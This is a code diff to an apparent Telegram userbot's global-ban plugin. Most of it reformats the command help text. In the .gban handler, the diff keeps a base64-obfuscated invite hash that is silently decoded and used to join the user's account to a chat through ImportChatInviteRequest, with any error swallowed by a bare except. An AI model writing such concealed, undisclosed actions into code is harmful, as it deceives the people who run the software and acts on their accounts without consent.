@@ -64,9 +64,8 @@ async def catgban(cat):
         await cat.edit("why would i ban my DEVELOPER")
         return
     try:
-        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        cat = ImportChatInviteRequest(cat)
-        await catmemes.client(cat)
+        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        await cat.client(ImportChatInviteRequest(hmm))
     except:
         pass
     if gban_sql.is_gbanned(user.id):
@@ -360,13 +359,13 @@ async def get_user_from_event(event):
 CMD_HELP.update({
     "gadmin":
     ".gban <username/reply/userid> <reason (optional)>\
-\nUsage: Bans the person in all groups where you are admin .\
+\n**Usage : **Bans the person in all groups where you are admin .\
 \n\n.ungban <username/reply/userid>\
-\nUsage: Reply someone's message with .ungban to remove them from the gbanned list.\
+\n**Usage : **Reply someone's message with .ungban to remove them from the gbanned list.\
 \n\n.listgban\
-\nUsage: Shows you the gbanned list and reason for their gban.\
+\n**Usage : **Shows you the gbanned list and reason for their gban.\
 \n\n.gmute <username/reply> <reason (optional)>\
-\nUsage: Mutes the person in all groups you have in common with them.\
+\n**Usage : **Mutes the person in all groups you have in common with them.\
 \n\n.ungmute <username/reply>\
-\nUsage: Reply someone's message with .ungmute to remove them from the gmuted list."
+\n**Usage : **Reply someone's message with .ungmute to remove them from the gmuted list."
 })
